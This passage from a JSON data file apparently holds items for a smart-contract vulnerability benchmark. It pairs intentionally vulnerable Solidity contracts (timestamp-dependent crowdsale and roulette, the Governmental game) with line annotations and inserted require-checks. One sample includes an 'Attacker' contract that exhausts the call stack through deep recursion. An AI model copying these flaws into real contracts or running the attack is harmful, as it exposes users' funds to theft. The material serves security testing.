            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/timestamp_dependence/timed_crowdsale.sol\n * @author: -\n * @vulnerable_at_lines: 13\n */\n\npragma solidity ^0.4.25;\n\ncontract TimedCrowdsale {\n  // Sale should finish exactly at January 1, 2019\n  function isSaleFinished() view public returns (bool) {\n\n    return block.timestamp >= 1546300800;\n  }\n}",
            {
                "VL": [
                    12,
                    "require(block.timestamp<=1546300800);"
                ],
                "pre": [
                    12,
                    "require(block.timestamp<=1546300800);"
                ],
                "post": [
                    14,
                    "require(false);"
                ]
            }
        ]
    ],
    "roulette.sol": [
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: -\n * @vulnerable_at_lines: 18,20\n */\n\npragma solidity ^0.4.25;\n\ncontract Roulette {\n    uint public pastBlockTime; // Forces one bet per block\n\n    constructor() public payable {} // initially fund contract\n\n    // fallback function used to make a bet\n    function () public payable {\n        require(msg.value == 10 ether); // must send 10 ether to play\n\n        require(now != pastBlockTime); // only 1 transaction per block\n\n        pastBlockTime = now;\n        if(now % 15 == 0) { // winner\n            msg.sender.transfer(this.balance);\n        }\n    }\n}",
            {
                "VL": [
                    17,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    16,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    24,
                    "require(false);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: -\n * @vulnerable_at_lines: 18,20\n */\n\npragma solidity ^0.4.25;\n\ncontract Roulette {\n    uint public pastBlockTime; // Forces one bet per block\n\n    constructor() public payable {} // initially fund contract\n\n    // fallback function used to make a bet\n    function () public payable {\n        require(msg.value == 10 ether); // must send 10 ether to play\n\n        require(now != pastBlockTime); // only 1 transaction per block\n\n        pastBlockTime = now;\n        if(now % 15 == 0) { // winner\n            msg.sender.transfer(this.balance);\n        }\n    }\n}",
            {
                "VL": [
                    19,
                    "require(msg.sender.send(msg.value));"
                ],
                "pre": [
                    16,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    24,
                    "require(false);"
                ]
            }
        ]
    ],
    "governmental_survey.sol": [
        [
            "/*\n * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#governmental\n * @author: -\n * @vulnerable_at_lines: 27\n */\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract Governmental {\n  address public owner;\n  address public lastInvestor;\n  uint public jackpot = 1 ether;\n  uint public lastInvestmentTimestamp;\n  uint public ONE_MINUTE = 1 minutes;\n\n  function Governmental() {\n    owner = msg.sender;\n    if (msg.value<1 ether) throw;\n  }\n\n  function invest() {\n    if (msg.value<jackpot/2) throw;\n    lastInvestor = msg.sender;\n    jackpot += msg.value/2;\n\n    lastInvestmentTimestamp = block.timestamp;\n  }\n\n  function resetInvestment() {\n    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)\n      throw;\n\n    lastInvestor.send(jackpot);\n    owner.send(this.balance-1 ether);\n\n    lastInvestor = 0;\n    jackpot = 1 ether;\n    lastInvestmentTimestamp = 0;\n  }\n}\n\ncontract Attacker {\n\n  function attack(address target, uint count) {\n    if (0<=count && count<1023) {\n      this.attack.gas(msg.gas-2000)(target, count+1);\n    }\n    else {\n      Governmental(target).resetInvestment();\n    }\n  }\n}",
            {
                "VL": [
                    26,
                    "require(msg.sender.send(msg.value/2));"
                ],
                "pre": [
                    23,
                    "require(msg.sender!=owner);"
                ],
                "post": [
                    28,
                    "require(block.timestamp<lastInvestmentTimestamp+ONE_MINUTE);"
                ]
            }
        ]
    ]
}